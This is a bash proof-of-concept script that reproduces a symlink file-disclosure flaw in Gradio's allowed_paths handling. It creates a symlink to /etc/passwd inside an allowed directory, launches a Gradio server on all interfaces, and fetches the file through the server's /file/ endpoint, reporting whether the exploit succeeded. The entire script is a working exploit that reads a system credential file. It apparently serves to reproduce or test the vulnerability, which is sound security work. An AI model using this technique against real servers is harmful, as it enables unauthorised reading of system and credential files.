#!/bin/bash
set -e

# Configuration
ALLOWED_DIR="/tmp/allowed_dir_$$"
SYMLINK="$ALLOWED_DIR/symlink_to_passwd"
PORT=7861

# Cleanup function to run on exit
cleanup() {
    pkill -f "gradio" || true
    rm -rf "$ALLOWED_DIR"
}
trap cleanup EXIT

# Step 1: Create allowed directory and symlink to /etc/passwd
mkdir -p "$ALLOWED_DIR"
ln -sf /etc/passwd "$SYMLINK"

# Step 2: Create and launch vulnerable server with allowed_paths
cat > "$ALLOWED_DIR/app.py" <<EOPY
import gradio as gr
iface = gr.Interface(lambda x:x, "textbox", "textbox")
iface.launch(allowed_paths=["$ALLOWED_DIR"], server_port=$PORT, server_name="0.0.0.0", share=False, debug=True, prevent_thread_lock=True)
EOPY

# Start the server in the background
python3 "$ALLOWED_DIR/app.py" &
sleep 5

# Step 3: Attempt to retrieve /etc/passwd via symlink
OUT=$(curl -s "http://127.0.0.1:$PORT/file/$SYMLINK" || true)

# Check if exploit succeeded
if echo "$OUT" | grep -q "root:x:0:0:"; then
    echo "[+] Exploit succeeded: /etc/passwd contents retrieved!"
    exit 0
else
    echo "[-] Exploit failed: could not retrieve /etc/passwd"
    exit 1
fi